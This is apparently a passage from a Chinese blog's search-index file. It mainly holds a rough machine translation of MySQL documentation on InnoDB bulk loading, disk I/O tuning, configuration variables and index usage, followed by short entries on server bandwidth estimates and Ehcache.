SQL import statements ...SET foreign_key_checks = 1;对于大表，这可以节省大量的磁盘I / O。INSERT 如果您需要插入多行， 请使用多行语法来减少客户端和服务器之间的通信开销：INSERT INTO的值（1,2），（5,5），...;此提示适用于插入任何表格，而不仅限于 InnoDB表格。当对具有自动增量列的表进行批量插入时，请将其设置 innodb_autoinc_lock_mode为2而不是默认值1.有关详细信息， 请参见 第14.8.1.5节“InnoDB中的AUTO_INCREMENT处理”。执行批量插入时，按PRIMARY KEY顺序插入行速度更快 。 InnoDB表使用 聚集索引，这使得使用数据的顺序相对较快PRIMARY KEY。 按PRIMARY KEY顺序执行批量插入对于完全不适合缓冲池的表格尤为重要。为了将数据加载到InnoDB FULLTEXT索引时获得最佳性能 ，请按照以下步骤操作：FTS_DOC_ID在创建表的时候 定义一个类型为BIGINT UNSIGNED NOT NULL，具有唯一索引的列 FTS_DOC_ID_INDEX。例如：CREATE TABLE t1（FTS_DOC_ID BIGINT unsigned NOT NULL AUTO_INCREMENT，title varchar（255）NOT NULL DEFAULT&apos;&apos;，文本中文NOT NULL，PRIMARY KEY（`FTS_DOC_ID`））ENGINE = InnoDB DEFAULT CHARSET = latin1;在t1（FTS_DOC_ID）上创建唯一索引FTS_DOC_ID_INDEX;将数据加载到表中。FULLTEXT数据加载完成后 创建索引。注意FTS_DOC_ID在创建表格 时添加列时，确保在 FTS_DOC_ID更新 FULLTEXT索引列时更新列，因为FTS_DOC_ID每个INSERTor 必须单调递增 UPDATE。 如果您选择不添加FTS_DOC_IDat表创建时间并InnoDB为您管理DOC ID，InnoDB则会FTS_DOC_ID在下一次CREATE FULLTEXT INDEX调用时将其添加 为隐藏列。 但是，这种方法需要重建表格，这会影响性能。 8.5.6优化InnoDB查询123456789101112131415161718192021222324252627要调整InnoDB表的查询，请在每个表上创建一组适当的索引。有关详细信息，请参见 第8.3.1节“MySQL如何使用索引”。遵循这些InnoDB索引的指标：由于每个InnoDB表都有一个 主键（无论您是否要求），请为每个表指定一组主键列，这些列用于最重要且时间关键的查询中。不要在主键中指定太多或太长的列，因为这些列值在每个二级索引中都是重复的。当索引包含不必要的数据时，读取此数据和内存以进行缓存的I / O会降低服务器的性能和可伸缩性。不要 为每列创建单独的 二级索引，因为每个查询只能使用一个索引。仅有少数不同值的很少测试的列或列索引可能对任何查询都没有帮助。 如果您对同一个表有很多查询，那么测试不同的列组合，尝试创建少量 连接索引而不是大量单列索引。 如果索引包含结果集所需的所有列（称为 覆盖索引），则查询可能完全避免读取表数据。如果索引列不能包含任何 NULL值，请NOT NULL在创建表时声明它。当知道每列是否包含NULL值时， 优化器可以更好地确定哪个索引最有效地用于查询 。您可以InnoDB使用第8.5.3节“优化InnoDB只读事务”中的技术优化表的 单一查询事务 。 8.5.7优化InnoDB DDL操作12345678910111213141516对于表和索引（CREATE，ALTER和 DROP语句）的DDL操作， 表中最重要的方面InnoDB是在MySQL 5.5和更高版本中创建和删除二级索引比在早期版本中快得多。 有关详细信息，请参见 第14.13.1节“在线DDL概述”。“ 快速索引创建 ”使得在某些情况下，在将数据加载到表中之前删除索引，然后在加载数据后重新创建索引会更快。使用TRUNCATE TABLE空表，不。外键约束，可以使一个语句的工作像一个普通的声明，在这种情况下，命令序列喜欢 和 可能是最快的。 DELETE FROM tbl_nameTRUNCATEDELETEDROP TABLECREATE TABLE因为主键是每个InnoDB表的存储布局不可分割的组成部分，并且更改主键的定义涉及重新组织整个表， 所以始终将主键设置为CREATE TABLE语句的一部分 ，并提前进行计划，以便您不需要 ALTER或DROP之后的主键。 8.5.8优化InnoDB磁盘I / O123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198如果您遵循SQL操作的数据库设计和调优技术的最佳实践，但由于繁重的磁盘I / O活动导致数据库仍然很慢，请考虑这些磁盘I / O优化。 如果Unix top工具或Windows任务管理器显示工作负载的CPU使用百分比低于70％，那么您的工作负载可能是磁盘限制的。增加缓冲池大小当表数据缓存在InnoDB 缓冲池中时，可以通过查询重复访问它，而不需要任何磁盘I / O。 用innodb_buffer_pool_size 选项指定缓冲池的大小 。 该内存区域非常重要，通常建议将 innodb_buffer_pool_size其配置为系统内存的50％至75％。 有关更多信息，请参见第8.12.4.1节“MySQL如何使用内存”。调整冲洗方法在GNU / Linux和Unix的某些版本中fsync()，InnoDB使用Unix 调用（ 默认使用）和类似方法将文件刷新到磁盘的速度惊人地慢。 如果数据库写入性能出现问题，请使用innodb_flush_method 参数集进行基准测试 O_DSYNC。在Linux上使用本机AIO的noop或截止日期I / O调度程序InnoDB使用Linux上的异步I / O子系统（本机AIO）来执行数据文件页面的预读和写入请求。 此行为innodb_use_native_aio 由默认情况下启用的配置选项控制 。 使用本机AIO时，I / O调度程序的类型对I / O性能有更大的影响。 通常，建议使用noop和截止日期I / O调度程序。进行基准测试以确定哪个I / O调度程序为您的工作负载和环境提供最佳结果。 有关更多信息，请参见 第14.6.8节“在Linux上使用异步I / O”。在x86_64体系结构的Solaris 10上使用直接I / O在InnoDBx86_64体系结构（AMD Opteron）的Solaris 10上使用存储引擎时，请使用直接I / O InnoDB相关文件以避免性能下降InnoDB。 要为用于存储InnoDB相关文件的整个UFS文件系统使用直接I / O，请 使用该forcedirectio选项安装它 ; 见 mount_ufs(1M)。 （Solaris 10 / x86_64上的默认设置不是使用此选项。） 要仅将直接I / O应用于InnoDB文件操作而不是整个文件系统，请设置 innodb_flush_method = O_DIRECT。 使用此设置， InnoDB呼叫 directio()而不是 fcntl() 用于I / O到数据文件（不用于I / O到日志文件）。在Solaris 2.6或更高版本中使用原始存储来存储数据和日志文件在任何版本的Solaris 2.6及更高版本和任何平台（sparc / x86 / x64 / amd64）上InnoDB使用具有较大innodb_buffer_pool_size值 的存储引擎时，请 InnoDB在裸设备上或单独的直接I / O UFS上使用数据文件和日志文件进行基准测试 文件系统，使用forcedirectio前面所述的安装选项。（innodb_flush_method如果需要对日志文件进行直接I / O ，则必须使用装入选项而不是设置 。）Veritas文件系统VxFS的用户应使用 convosync=direct装入选项。不要将其他MySQL数据文件（如MyISAM表的那些文件） 放在直接I / O文件系统上。不能将可执行文件或库放置在直接I / O文件系统上。使用额外的存储设备可以使用其他存储设备来设置RAID配置。有关相关信息，请参见 第8.12.2节“优化磁盘I / O”。或者，InnoDB表空间数据文件和日志文件可以放在不同的物理磁盘上。有关更多信息，请参阅以下部分：第14.6.1节“InnoDB启动配置”第14.7.5节“在数据目录之外创建文件 - 表 - 表 - 表空间”创建一个通用表空间第14.8.1.3节“移动或复制InnoDB表”考虑非旋转存储非循环存储通常为随机I / O操作提供更好的性能; 和顺序I / O操作的旋转存储。在通过旋转和非旋转存储设备分发数据和日志文件时，请考虑主要在每个文件上执行的I / O操作的类型。随机I /面向O形文件通常包括 文件的每个表 和普通表空间的数据文件， 撤销表空间 文件和 临时表空间文件。 连续的面向I / O的文件包括InnoDB 系统表空间文件（由于 二次写入缓冲和 更改缓冲）以及日志文件（如二进制日志文件和重做日志文件）。使用非循环存储时，请查看以下配置选项的设置：innodb_checksum_algorithm该crc32选件使用更快的校验和算法，推荐用于快速存储系统。innodb_flush_neighbors该选项优化了旋转存储设备的I / O。禁用它用于非旋转存储或混合旋转和非旋转存储。innodb_io_capacity对于较低端的非旋转存储设备，默认设置200通常是足够的。对于更高端的总线连接设备，请考虑更高的设置，例如1000。innodb_io_capacity_max默认值2000适用于使用非循环存储的工作负载。对于高端，总线连接的非旋转存储设备，考虑更高的设置，如2500。innodb_log_compressed_pages如果重做日志位于非循环存储中，请考虑禁用此选项以减少日志记录。请参阅 禁用压缩页面的记录。innodb_log_file_size如果重做日志位于非循环存储中，请配置此选项以最大化高速缓存和写入组合。innodb_page_size考虑使用与磁盘的内部扇区大小相匹配的页面大小。早期的SSD设备通常具有4k扇区大小。一些较新的设备具有16k扇区大小。 默认InnoDB 页面大小为16k。保持页面大小接近存储设备块大小可将重写到磁盘的未更改数据量减到最少。binlog_row_image如果二进制日志位于非循环存储中，并且所有表都有主键，请考虑设置此选项minimal以减少日志记录。确保为您的操作系统启用TRIM支持。它通常默认启用。增加I / O容量以避免积压如果由于InnoDB 检查点 操作导致吞吐量周期性下降 ，请考虑增加innodb_io_capacity 配置选项的值 。 较高的值会导致更频繁的 刷新，从而避免可能导致吞吐量下降的工作积压。如果冲洗不落后，则I / O容量降低如果系统不会因InnoDB 冲洗操作而落后 ，请考虑降低innodb_io_capacity 配置选项的值 。 通常情况下，您保持该选项的值尽可能低，但不能太低，以至于导致吞吐量的周期性下降，如前面的项目符号所述。 在可以降低选项值的典型场景中，您可能会在以下输出中看到类似的组合 SHOW ENGINE INNODB STATUS：历史名单长度低，低于几千。插入缓冲区合并接近插入的行。修改缓冲池中的页面始终远低于 innodb_max_dirty_pages_pct 缓冲池。（在服务器没有进行批量插入时进行测量;在批量插入时修改的页面百分比显着增加，这是正常的。）Log sequence number - Last checkpoint 小于7/8或理想情况下小于InnoDB 日志文件总大小的6/8 。将系统表空间文件存储在Fusion-io设备上通过在支持原子写入的Fusion-io设备上存储系统表空间文件（“ ibdata文件 ”），您可以利用与双写缓冲区相关的I / O优化。 在这种情况下，innodb_doublewrite自动禁用doublewrite buffering（），并且Fusion-io原子写入用于所有数据文件。 此功能仅在Fusion-io硬件上受支持，并且仅适用于Linux上的Fusion-io NVMFS。 要充分利用此功能，建议使用此 innodb_flush_method设置O_DIRECT。注意由于双写缓冲区设置是全局性的，所以对于驻留在非Fusion-io硬件上的数据文件，也会禁用双写缓冲。禁用压缩页面的日志记录使用InnoDB表格 压缩功能时，当对压缩数据进行更改时，重新压缩页面的图像 将写入 重做日志。 此行为innodb_log_compressed_pages由默认情况下启用的控制 ，以防止zlib 在恢复期间使用不同版本的压缩算法时可能发生的损坏。 如果您确定zlib版本不会更改，请禁用 innodb_log_compressed_pages 以减少修改压缩数据的工作负载的重做日志生成。 8.5.9优化InnoDB配置变量1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192不同的设置对于服务器的工作效率最高，可以预测负载较轻，而服务器则始终处于满负荷运行状态，或者遇到高活动的峰值。由于InnoDB存储引擎会自动执行许多优化，因此许多性能调整任务都需要进行监视，以确保数据库性能良好，并在性能下降时更改配置选项。有关详细的性能监控信息，请参见 第14.16节“InnoDB与MySQL性能架构的集成”InnoDB。您可以执行的主要配置步骤包括：允许InnoDB在包含它们的系统上使用高性能内存分配器。请参见 第14.6.4节“为InnoDB配置内存分配器”。控制哪些InnoDB缓冲区更改数据的数据更改操作的类型 ，以避免频繁的小磁盘写入。请参见 第14.6.5节“配置InnoDB更改缓冲”。由于默认设置是缓冲所有类型的数据更改操作，因此只有在需要减少缓冲量时才更改此设置。使用该innodb_adaptive_hash_index 选项打开和关闭自适应哈希索引功能 。有关更多信息，请参见第14.4.3节“自适应散列索引”。 您可能会在非正常活动期间更改此设置，然后将其恢复到原始设置。InnoDB如果上下文切换是瓶颈，则 设置对并发线程数量的 限制。请参见 第14.6.6节“为InnoDB配置线程并发”。控制InnoDB与其预读操作相关的预取量 。当系统没有使用I / O容量时，更多的预读可以提高查询的性能。 预读过多会导致重负载系统的性能周期性下降。请参见 第14.6.3.5节“配置InnoDB缓冲池预取（预读）”。如果您有一个高端I / O子系统未被默认值充分利用，则增加读取或写入操作的后台线程数。请参见 第14.6.7节“配置背景InnoDB I / O线程数”。控制I / O InnoDB在后台执行多少操作。请参见 第14.6.9节“配置InnoDB主线程I / O速率”。 如果您观察到性能的周期性下降，您可能会缩减此设置。控制确定何时InnoDB执行某些类型的背景写入的算法 。请参见 第14.6.3.6节“配置InnoDB缓冲池刷新”。该算法适用于某些类型的工作负载，但不适用于其他类型的工作负载，因此如果观察到性能下降，可能会关闭此设置。利用多核处理器及其高速缓存存储器配置，尽量减少上下文切换的延迟。请参见 第14.6.10节“配置旋转锁定轮询”。防止诸如表扫描之类的一次性操作干扰存储在InnoDB缓冲区高速缓存中的经常访问的数据 。请参见 第14.6.3.4节“使缓冲池抗扫描”。将日志文件调整为适合可靠性和崩溃恢复的大小。InnoDB 日志文件通常很小，以避免崩溃后的长时间启动。MySQL 5.5中引入的优化加速了崩溃恢复过程的某些步骤 。尤其是，由于改进了内存管理算法，扫描 重做日志和应用重做日志速度更快。如果为了避免很长的启动时间而将您的日志文件人为保留较小，现在可以考虑增加日志文件大小以减少由于重做日志记录的回收而发生的I / O。为InnoDB缓冲池配置实例的大小和数量， 对于具有多千兆字节缓冲池的系统尤为重要。请参见 第14.6.3.3节“配置多个缓冲池实例”。增加并发事务的最大数量，这极大地提高了最繁忙数据库的可伸缩性。请参见第14.4.8节“撤消日志”。将清除操作（一种垃圾收集）移动到后台线程中。请参见 第14.6.11节“配置InnoDB清除计划”。要有效测量此设置的结果，请首先调整其他I / O相关和线程相关的配置设置。减少InnoDB并发线程之间的交换量 ，以便繁忙服务器上的SQL操作不会排队并形成“ 交通拥堵 ”。为该innodb_thread_concurrency 选项设置一个值， 对于高性能的现代系统，最高可达约32。增加该innodb_concurrency_tickets 选项的值 ，通常为5000左右。这些选项的组合设置了线程数量的上限 InnoDB 在任何时候都可以进行处理，并且允许每个线程在被换出之前做大量的工作，以便等待的线程数量保持低，并且操作可以在没有过度上下文切换的情况下完成。 8.5.10为具有多个表的系统优化InnoDB12345678910如果您已配置 的非持久性优化统计（非默认配置）， InnoDB计算指标 基数值表中的第一次表，启动后访问，而不是在表中存储这些值。在将数据分割成多个表的系统上，此步骤可能会花费大量时间。由于此开销仅适用于初始表打开操作，要“ 预热 ” 表供以后使用，请在启动后立即通过发出诸如“&gt;”之类的语句来访问它。 SELECT 1 FROM tbl_name LIMIT 1优化器统计信息默认保存到磁盘，由innodb_stats_persistent 配置选项启用 。有关持久化优化器统计信息的信息，请参见 第14.6.12.1节“配置持久性优化器统计信息参数”。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器带宽]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-deploy%2Fbandwidth%2F</url>
    <content type="text"><![CDATA[首先要知道影响在线人数的因素 1，访问量 2，网站类型：如果是出文字的网站(如小说站)，1M带宽带动日均5000IP，还勉强。如果是普通网站有图片，有文字、论坛、新闻资讯类型网站 大概1M能带一千IP。考虑到高峰期并发，1M高峰期还会卡。【最低配 单核CPU+512内存。1千IP CPU占用10%左右，内存200到300之间】。 下面根据影响因素计算下1M带宽能同时承受多少人在线(以网络状况良好为前提) 1、 打开网站8秒原则; 2、 评判的只是：用户从云服务器下载文件的速度; 3、 页面的标准尺寸大小为：60KB; 参考公式：支持连接个人 = 服务器带宽/页面尺寸大小 通过计算大致结果是，1Mbps的带宽(服务器的1M带宽最快上下速度能达到1M/s，跟我们家用的带宽稍有区别)支持的连接数为：17个 因此，N M带宽可以支持的同时在线人数大概为N*17个 所以，1M带宽的云主机，日均3000IP以下应该没问题。当然如果你的每个页面都比较大的话，那就没这么多了。具体多少，可以按照上面的算法算下。 12345678910111213141516171819202122232425262728初次访问 362kb第二次访问 36kbpv 8641+2007+1000 = 11648pv * 362 = 4216576kb = 4117.75MB 4GB流量market初次171kb第二次 28kbpv= 3000pv * 171 = 513000 = =500.97MB一天按5GB 流量30天 是 150GB流量0.8 * 150 = 120RMB带宽5 Mbps 125 RMB10 Mbps 125 + （10 - 5 ）* 80RMB = =525 RMB元]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ehcache]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fehcache%2F</url>
    <content type="text"><![CDATA[ehcache service层缓存系统 发展史 Ehcache 开发者（S） Terracotta，Inc。[1] 稳定版本 3.3.0 / 2017年2月1日; 16个月前 写入 Java的 操作系统 跨平台 类型 高速缓存 执照 Apache许可证 2.0 网站 www.ehcache.org Ehcache是一个开源的Java 分布式缓存，用于通用缓存，Java EE和轻量级容器[ 澄清 ]。[2] Ehcache在Apache开源许可下可用。[1] Ehcache由Greg Luck于2003年开发。2009年，该项目由Terracotta购买，后者提供付费支持。 该软件仍然是开源软件，但一些新的主要功能（Fast Restartability Consistency）仅适用于Enterprise Ehcache和BigMemory等非开源的商业产品。 2011年3月，维基媒体基金会宣布将使用Ehcache来改善其维基项目的性能。[3]然而，在测试显示该方法的问题后，这很快就被放弃了。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【SQL索引】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-indexes%2F</url>
    <content type="text"><![CDATA[提高操作性能的最佳方法 SELECT是在查询中测试的一列或多列上创建索引。索引条目就像指向表行的指针，允许查询快速确定哪些行与WHERE子句中的条件匹配，并检索这些行的其他列值。所有的MySQL数据类型都可以被索引。 尽管为查询中使用的每个可能的列创建索引是很诱人的，但不必要的索引会浪费空间并浪费时间让MySQL确定要使用的索引。索引还会增加插入，更新和删除的成本，因为每个索引都必须更新。您必须找到适当的平衡，才能使用最佳索引集实现快速查询。 8.3.1 MySQL如何使用索引12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667索引用于快速查找具有特定列值的行。如果没有索引，MySQL必须从第一行开始，然后读取整个表以查找相关行。表格越大，成本越高。如果表中有相关​​列的索引，MySQL可以快速确定在数据文件中间寻找的位置，而无需查看所有数据。这比按顺序读取每一行要快得多。大多数MySQL索引（PRIMARY KEY， UNIQUE，INDEX和 FULLTEXT）存储在 B树。例外：空间数据类型的索引使用R树; MEMORY 表还支持散列索引 ; 索引InnoDB使用倒排列表FULLTEXT。一般来说，索引的使用将在下面的讨论中描述。第8.3.8节“B树和散列索引的比较”MEMORY中描述了特定于散列索引的特性（如表中所用 ） 。MySQL使用这些操作的索引：WHERE快速 查找与子句匹配的行。考虑排除行。如果在多个索引之间有选择，MySQL通常使用找到最少行数的索引（最具 选择性的索引）。如果表具有多列索引，则优化器可以使用该索引的任何最左边的前缀来查找行。例如，如果你有一个三列索引上 (col1, col2, col3)，你有索引的搜索功能(col1)， (col1, col2)以及(col1, col2, col3)。有关更多信息，请参见 第8.3.5节“多列索引”。在执行连接时从其他表中检索行。如果它们被声明为相同的类型和大小，MySQL可以更有效地在列上使用索引。在这种情况下， VARCHAR与 CHAR被认为是相同的，如果它们被声明为相同的大小。例如， VARCHAR(10)和 CHAR(10)大小相同，但 VARCHAR(10)与 CHAR(15)不是。为了比较非二进制字符串列，两列应使用相同的字符集。例如，将utf8列与 latin1列进行比较将排除索引的使用。比较不同的列（例如，比较字符串列与时间或数字列）可能会阻止使用索引，如果无法直接比较值而不进行转换。对于给定的值，如1 在数值列，它可能比较等于在字符串列，例如任何数量的值 &apos;1&apos;，&apos; 1&apos;， &apos;00001&apos;，或&apos;01.e1&apos;。这排除了字符串列的任何索引的使用。查找特定索引列的值MIN()或 MAX()值key_col。这由预处理器进行了优化，该预处理器检查您是否使用 索引中之前发生的所有关键部件。在这种情况下，MySQL会为每个表达式或 单个表达式执行单键查找，并用常量替换它。如果所有表达式都被常量替换，则查询立即返回。例如： WHERE key_part_N = constantkey_colMIN()MAX()SELECT MIN（key_part2），MAX（key_part2） FROM tbl_nameWHERE key_part1= 10;如果排序或分组是在可用索引的最左侧前缀（例如，）上完成，则对表排序或分组 。如果所有关键部件都紧随其后，则按相反的顺序读取钥匙。请参见 第8.2.1.13节“按优化排序”和 第8.2.1.14节“GROUP BY优化”。 ORDER BY key_part1, key_part2DESC在某些情况下，可以优化查询以在不查询数据行的情况下检索值。（为查询提供所有必要结果的索引称为 覆盖索引。）如果查询仅使用表中某些索引中包含的列，则可以从索引树中检索所选值以获得更高的速度：SELECT key_part3FROM tbl_name WHERE key_part1= 1索引对于小型表或查询处理大部分或全部行的大型表的查询不太重要。当查询需要访问大多数行时，顺序读取比通过索引处理更快。即使并非查询所需的所有行，顺序读取也会使磁盘搜索次数最小化。有关详细信息，请参见第8.2.1.19节“避免全表扫描”。 8.3.2主键优化12345678表的主键表示您在最重要的查询中使用的一列或一组列。它有一个关联索引，用于快速查询性能。查询性能从NOT NULL优化中受益，因为它不能包含任何NULL值。通过InnoDB存储引擎，表格数据的物理组织可以进行超快速查找，并根据主键列进行排序。如果您的表格很重要，但没有明显的列或一组列作为主键，那么您可以创建一个带有自动增量值的单独列作为主键。当您使用外键连接表时，这些唯一ID可用作指向其他表中相应行的指针。 8.3.3外键优化1234如果一个表有许多列，并且查询了许多不同的列组合，将不常用的数据拆分为每列有几列的单独表格，并通过复制数字ID将它们关联回主表可能很有效主表中的列。这样，每个小表可以有一个快速查找其数据的主键，并且可以使用连接操作仅查询需要的一组列。根据数据的分布情况，查询可能会执行较少的I / O并占用较少的缓存内存，因为相关列在磁盘上打包在一起。（为了最大限度提高性能，查询尝试从磁盘读取尽可能少的数据块; 8.3.4列索引12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879最常见的索引类型涉及单列，将该列中值的副本存储在数据结构中，从而允许快速查找具有相应列值的行。B树数据结构可以让索引快速查找特定值，一组值，或值的范围，对应于运营商，如=， &gt;，≤， BETWEEN，IN，等等，一在WHERE子句。每个表的最大索引数和最大索引长度是根据每个存储引擎定义的。请参阅 第14章InnoDB存储引擎和 第15章备用存储引擎。所有存储引擎每个表至少支持16个索引，总索引长度至少为256个字节。大多数存储引擎有更高的限制。有关列索引的其他信息，请参见 第13.1.14节“CREATE INDEX语法”。索引前缀FULLTEXT索引空间索引MEMORY存储引擎中的索引索引前缀使用 字符串列的索引规范中的语法，可以创建仅使用列的前几个字符的索引 。以这种方式仅索引列值的前缀可以使索引文件更小。索引一 列或一 列时，您 必须为该索引指定一个前缀长度。例如： col_name(N)NBLOBTEXTCREATE TABLE测试（blob_col BLOB，INDEX（blob_col（10）））;前缀长度可以达到1000字节（InnoDB表格为767字节 ，除非已 innodb_large_prefix设置）。注意前缀限制以字节为单位，而在前缀长度CREATE TABLE， ALTER TABLE和 CREATE INDEX语句被解释为非二进制串类型的字符数（CHAR， VARCHAR， TEXT二进制串类型（）和字节数BINARY， VARBINARY， BLOB）。为使用多字节字符集的非二进制字符串列指定前缀长度时，请考虑这一点。有关索引前缀的更多信息，请参见 第13.1.14节“CREATE INDEX语法”。FULLTEXT索引FULLTEXT索引用于全文搜索。只有InnoDB和 MyISAM存储引擎支持 FULLTEXT索引和仅适用于 CHAR， VARCHAR和 TEXT列。索引始终在整个列上进行，并且不支持列前缀索引。有关详细信息，请参见 第12.9节“全文搜索功能”。优化适用于FULLTEXT针对单个InnoDB表的某些类型的 查询 。具有这些特征的查询特别有效：FULLTEXT 只返回文档ID或文档ID和搜索等级的查询。FULLTEXT查询按匹配的降序对匹配的行进行排序，并应用一个 LIMIT子句获取前N个匹配行。为了应用这种优化，不得有 WHERE条款并且只有一个 ORDER BY条款按降序排列。FULLTEXT只检索COUNT(*)与搜索词相匹配的行的 值的查询，没有附加WHERE 子句。将该WHERE子句编码为 没有任何比较运算符。 WHERE MATCH(text) AGAINST (&apos;other_text&apos;)&gt; 0对于包含全文表达式的查询，MySQL会在查询执行的优化阶段评估这些表达式。优化器不仅查看全文表达式并进行估计，而且在开发执行计划的过程中实际评估它们。此行为的含义是， EXPLAIN对于全文查询，通常比在优化阶段没有进行表达式评估的非全文查询要慢。EXPLAIN由于在优化过程中发生匹配，全文查询可能会显示Select tables optimized away在Extra列中; 在这种情况下，在稍后的执行过程中不需要进行表访问。空间索引您可以创建空间数据类型的索引。 MyISAM并InnoDB 支持空间类型的R-tree索引。其他存储引擎使用B树来索引空间类型（除了 ARCHIVE不支持空间类型索引）。MEMORY存储引擎中的索引该MEMORY存储引擎使用 HASH默认的索引，而且还支持 BTREE索引。 8.3.5多列索引123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475MySQL可以创建复合索引（即多列索引）。索引最多可以包含16列。对于某些数据类型，您可以索引列的前缀（请参见 第8.3.4节“列索引”）。MySQL可以对测试索引中所有列的查询使用多列索引，或者只测试第一列，前两列，前三列等等的查询。如果您在索引定义中以正确顺序指定列，则单个组合索引可以加速同一个表上的多种查询。多列索引可以被认为是一个有序数组，其行包含通过连接索引列的值创建的值。注意作为组合索引的替代方法，您可以引入基于来自其他列的信息的“ 哈希 ”列。如果此列较短，合理唯一且编制索引，则它可能比许多列上的“ 宽 ”索引更快。在MySQL中，使用这个额外的列非常容易：SELECT * FROM tbl_name WHERE hash_col= MD5（CONCAT（val1，val2）） AND col1= val1AND col2= val2;假设一张表具有以下规格：CREATE TABLE测试（ id INT NOT NULL， last_name CHAR（30）NOT NULL， first_name CHAR（30）NOT NULL， PRIMARY KEY（id）， INDEX名称（姓氏，名字））;该name指数是在一个索引 last_name和first_name 列。该索引可用于在查询中查找，以指定已知范围中的 值last_name和first_name值的组合 。它也可以用于仅指定last_name值的查询， 因为该列是索引的最左边的前缀（如本节后面所述）。因此，该name索引用于以下查询中的查找：SELECT * FROM test WHERE last_name =&apos;Widenius&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos;AND first_name =&apos;Michael&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos; AND（first_name =&apos;Michael&apos;OR first_name =&apos;Monty&apos;）;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos; AND first_name&gt; =&apos;M&apos;AND first_name &lt;&apos;N&apos;;但是，name索引 不用于以下查询中的查找：SELECT * FROM test WHERE first_name =&apos;Michael&apos;;SELECT * FROM测试 WHERE last_name =&apos;Widenius&apos;OR first_name =&apos;Michael&apos;;假设您发出以下 SELECT声明：SELECT * FROM tbl_name WHERE col1 = val1AND col2 = val2;如果一个多列索引存在于col1和 col2，相应的行可以直接取出。如果在col1和上存在单独的单列索引 col2，优化器将尝试使用索引合并优化（请参见 第8.2.1.3节“索引合并优化”）， 或尝试通过确定哪个索引排除更多行并使用它来尝试查找最具限制性的索引该索引来获取行。如果表具有多列索引，则优化器可以使用该索引的任何最左边的前缀来查找行。例如，如果你有一个三列索引上(col1, col2, col3)，你有索引的搜索功能 (col1)，(col1, col2)以及 (col1, col2, col3)。如果列不构成索引的最左边的前缀，则MySQL不能使用索引执行查找。假设你有SELECT这里显示的语句：SELECT * FROM tbl_nameWHERE col1 = val1;SELECT * FROM tbl_nameWHERE col1 = val1AND col2 = val2;SELECT * FROM tbl_nameWHERE col2 = val2;SELECT * FROM tbl_nameWHERE col2 = val2AND col3 = val3;如果索引存在(col1, col2, col3)，则只有前两个查询使用该索引。第三和第四个查询确实包括索引的列，但不使用索引来进行查找，因为(col2)和 (col2, col3)不是的最左边的前缀 (col1, col2, col3)。 8.3.6检验索引使用情况12始终检查您的所有查询是否确实使用您在表中创建的索引。EXPLAIN如第8.8.1节“使用EXPLAIN优化查询”中所述使用该 语句。 8.3.7 InnoDB和MyISAM指数统计收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889存储引擎收集关于优化器使用的表的统计信息。表统计信息基于值组，其中值组是具有相同关键字前缀值的一组行。为了优化器的目的，重要的统计数据是平均值组大小。MySQL通过以下方式使用平均值组大小：估计每次ref访问 必须读取的行数估计部分连接将产生多少行; 也就是说，这个表单的操作将会产生的行数：（...）JOIN tbl_nameON tbl_name。key=expr随着索引的平均值组大小增加，索引对于这两个目的的用处不大，因为每次查找的平均行数增加：为了使索引适合优化，最好每个索引值的目标是小表格中的行数。当一个给定的索引值产生大量的行时，该索引不太有用，而MySQL不太可能使用它。平均值组大小与表基数有关，这是值组的数量。该 SHOW INDEX语句基于表显示基数值N/S，其中 N表S是行中的行数，并且是平均值组大小。该比率在表格中产生了近似数量的值组。为联接基础上，&lt;=&gt;比较运营商，NULL没有从任何其它值区别对待：NULL &lt;=&gt; NULL，就像任何其他 。 N &lt;=&gt; NN但是，对于基于=运算符的连接， NULL与非NULL值不同： 在或 （或两者）都不 是真时 。这会影响 对表单进行比较的访问：如果当前值为is ，则MySQL将不访问表 ，因为比较不成立。 expr1 = expr2expr1expr2NULLreftbl_name.key = exprexprNULL为了=比较，NULL表中有多少个值并不重要。出于优化目的，相关值是非NULL值组的平均大小。但是，MySQL目前不支持收集或使用平均大小。对于 表InnoDB和MyISAM表，您可以分别通过innodb_stats_method和 myisam_stats_method系统变量来控制表统计信息的收集 。这些变量有三个可能的值，其不同之处如下：当变量设置为时nulls_equal，所有NULL值都被视为相同（即它们都形成单个值组）。如果NULL值组大小远高于平均非NULL值组大小，则此方法会向上倾斜平均值组大小。这使得索引对于优化器来说显得不如对于查找非NULL值的联接有用。因此，该 nulls_equal方法可能会导致优化器ref在应该访问时不使用索引进行 访问。当变量设置为时 nulls_unequal，NULL 值不被视为相同。相反，每个 NULL值形成一个大小为1的单独值组。如果您有很多NULL值，则此方法会向下倾斜平均值组大小。如果平均非NULL值组大小较大，则将值计算NULL为一组大小1会导致优化程序高估查找非NULL 值的连接的索引值。因此，当其他方法可能更好时，该nulls_unequal 方法可以使优化器使用该索引进行 ref查找。当变量设置为时 nulls_ignored，NULL 值将被忽略。如果你倾向于使用很多连接在使用 &lt;=&gt;，而不是=， NULL值并不特殊，在比较和一个NULL等于另一个。在这种情况下，nulls_equal是适当的统计方法。该innodb_stats_method系统变量具有全局值; 该 